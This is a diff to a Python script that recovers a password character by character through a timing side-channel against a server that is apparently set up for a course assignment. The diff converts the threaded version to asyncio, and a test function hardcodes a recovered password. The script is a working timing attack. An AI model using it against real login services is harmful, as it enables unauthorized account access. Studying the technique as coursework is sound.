@@ -1,17 +1,17 @@
 import urllib.parse
 import time
-from concurrent.futures import ThreadPoolExecutor
-from ThreadSafeCounter import ThreadSafeTimeTracker
+from Counter import Counter
 from decimal import Decimal, getcontext
 import pycurl
 import io
 import threading
+import asyncio
 
 _thread_local = threading.local()
 
 ### --- Global Variables --- ###
 
-DIFFICULTY = 5
+DIFFICULTY = 1
 
 BASE_URL = "aoi-assignment1.oy.ne.ro"
 SERVER_PORT = 8080
@@ -98,45 +98,44 @@ def num_repetitions(discovered_length):
     """
     global LENGTH
     # all times 1/internet speed slt
-    return min(100, discovered_length*DIFFICULTY + DIFFICULTY*DIFFICULTY)
+    return discovered_length*DIFFICULTY + DIFFICULTY*DIFFICULTY + 1
 
 
-def crack_next_char(discovered_length, executor):
+async def crack_next_char(discovered_length):
     global NUMBER_OF_THREADS
     # to warm up the connection
     try_pass2("!")
     r = 1 if LENGTH - discovered_length == 1 else num_repetitions(discovered_length)
-    counter = ThreadSafeTimeTracker()
+    counter = Counter()
     parts = split_charset()
-    futures = []
+    tasks = []
     for round in range(r):
         for part in parts:
-            futures.append(executor.submit(worker, part, discovered_length, counter))
-    # Wait for all threads to complete
-    # outside of the loop so that each round wont have to wait on 
-    # the previous one to finish
-    for future in futures:
-        future.result()
+            tasks.append(asyncio.create_task(check_char(part, discovered_length, counter)))
+    await asyncio.gather(*tasks)
     return counter.get_max_letter()
     
 
 
-def worker(chars, discovered_length, counter):
+async def check_char(chars, discovered_length, counter):
     global PASSWORD, LENGTH
+    # Get the current event loop
+    loop = asyncio.get_running_loop()
+    
     if LENGTH - discovered_length == 1:
         for char in chars:
-            result = try_pass2(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
+            result = await loop.run_in_executor(None, try_pass2, PASSWORD + char + "a" * (LENGTH-discovered_length-1))
             if result.get("Data"):
                 counter.record_time(char, result.get("Time"))
     else:
         for char in chars:
-            result = try_pass2(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
+            result = await loop.run_in_executor(None, try_pass2, PASSWORD + char + "a" * (LENGTH-discovered_length-1))
             counter.record_time(char, result.get("Time"))
 
 
 ### ------------------------- ###
 
-def main():
+async def main():
     global PASSWORD, LENGTH
     start = time.perf_counter()
     print("Cracking the password...")
@@ -146,11 +145,11 @@ def main():
     print(f"Password length: {LENGTH}")
     # second step - crack the password char by char
     discovered_length = 0
-    with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
-        while len(PASSWORD) < LENGTH:
-            PASSWORD += crack_next_char(discovered_length, executor)
-            discovered_length += 1
-            print(f"Password so far: {PASSWORD}")
+    while len(PASSWORD) < LENGTH:
+        c = await crack_next_char(discovered_length)
+        PASSWORD += c
+        discovered_length += 1
+        print(f"Password so far: {PASSWORD}")
     end = time.perf_counter()
     print("-------------------")
     print(try_pass2(PASSWORD))
@@ -160,4 +159,4 @@ def test():
     print(try_pass2("usobopdjrcvbvmfz"))
 
 if __name__ == '__main__':
-    main()
+    asyncio.run(main())
